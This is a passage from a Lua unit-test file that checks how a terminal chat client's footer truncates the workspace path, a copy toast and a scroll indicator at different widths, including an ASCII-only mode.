    local long_ws = "/home/user/projects/very/long/workspace/path/for/footer/truncation"
    local function footer_at(width)
      local uimod = boot(nil, { width = width, height = 24 }, { config = { load = function()
        return { model = "test-model-name-long-enough-to-matter", workspace = long_ws,
                 ui = { input_max_lines = 8 } } end,
        api_key = function() return "" end } })
      local S = uimod._get_state()
      S.tokens_in, S.tokens_out = 3000, 1000
      S.tokens_max, S.tokens_used = 32000, 4100
      S.toast = "✓ скопировано 42 B"
      uimod._transcript.reset({})
      for i = 1, 40 do
        uimod._transcript.append({ role = "system", text = "row " .. i })
      end
      uimod._invalidate_all()
      S.user_scrolled = true
      S.scroll = 7
      uimod._paint(true)
      local L = uimod._layout()
      return uimod, S, strip(uimod._row(L.footer_row) or ""), L.w
    end

    -- roomy enough: full path, toast and scroll all visible
    local _, _, wide = footer_at(120)
    assert_true(wide:find(long_ws, 1, true) ~= nil, "pi 5.5 roomy footer keeps the full path: " .. wide)
    assert_true(wide:find("скопировано", 1, true) ~= nil, "pi 5.5 roomy footer shows the toast: " .. wide)
    assert_true(wide:find("↓ +7", 1, true) ~= nil, "pi 5.5 roomy footer shows the scroll flag: " .. wide)

    -- narrow: path truncates first — toast and scroll must survive
    -- (60 is the floor where stats+toast+scroll leave room for a truncated path)
    local uimod_n, _, narrow, w_n = footer_at(60)
    assert_true(uimod_n.vlen(narrow) <= w_n, "pi 5.5 narrow footer fits the width")
    assert_eq(narrow:find(long_ws, 1, true), nil, "pi 5.5 narrow footer truncates the path: " .. narrow)
    assert_true(narrow:find("…", 1, true) ~= nil or narrow:find("...", 1, true) ~= nil,
      "pi 5.5 truncated path carries an ellipsis: " .. narrow)
    assert_true(narrow:find("скопировано", 1, true) ~= nil,
      "pi 5.5 toast survives path truncation (path drops first): " .. narrow)
    assert_true(narrow:find("↓ +7", 1, true) ~= nil,
      "pi 5.5 scroll flag survives path truncation: " .. narrow)

    -- path gone from the left (no room): toast drops before scroll, then
    -- stats truncate — the path must reappear (fit_path re-claims room)
    -- or, if stats alone fill the row, stats are truncated not dropped whole.
    local uimod_t, _, row_t, w_t = footer_at(40)
    assert_true(uimod_t.vlen(row_t) <= w_t, "pi 5.5 tiny footer fits the width")
    -- toast is dropped before scroll when both cannot fit
    local has_toast = row_t:find("скопировано", 1, true) ~= nil
    local has_scroll = row_t:find("↓ +7", 1, true) ~= nil
    assert_true(not has_toast or has_scroll,
      "pi 5.5 toast never outlives the scroll flag once space runs out: " .. row_t)
    assert_true(has_scroll,
      "pi 5.5 scroll flag outlives the toast on a tiny row: " .. row_t)

    -- ASCII mode: path truncation must use "...", never "…" (width 60 keeps
    -- a truncated path on the row alongside stats, toast and scroll)
    local uimod_a = boot(nil, { width = 60, height = 24 }, { config = { load = function()
      return { model = "test-model-name", workspace = long_ws,
               ui = { input_max_lines = 8 } } end,
      api_key = function() return "" end } })
    uimod_a._ascii_mode = true
    local Sa = uimod_a._get_state()
    Sa.tokens_in, Sa.tokens_out = 3000, 1000
    Sa.tokens_max, Sa.tokens_used = 32000, 4100
    Sa.toast = "[ok] copied 42 B"
    uimod_a._transcript.reset({})
    for i = 1, 40 do
      uimod_a._transcript.append({ role = "system", text = "row " .. i })
    end
    uimod_a._invalidate_all()
    Sa.user_scrolled = true
    Sa.scroll = 7
    uimod_a._paint(true)
    local La = uimod_a._layout()
    local ascii_row = uimod_a._row(La.footer_row) or ""
    assert_eq(ascii_row:find("…", 1, true), nil,
      "pi 5.5 ASCII footer introduces no Unicode ellipsis: " .. strip(ascii_row))
    assert_true(ascii_row:find("...", 1, true) ~= nil,
      "pi 5.5 ASCII truncated path uses ASCII dots: " .. strip(ascii_row))
    uimod_a._ascii_mode = nil
  end

  print("pi-style-input-and-footer frame/unit tests: OK")
end

if failed > 0 then
    os.exit(1)
end
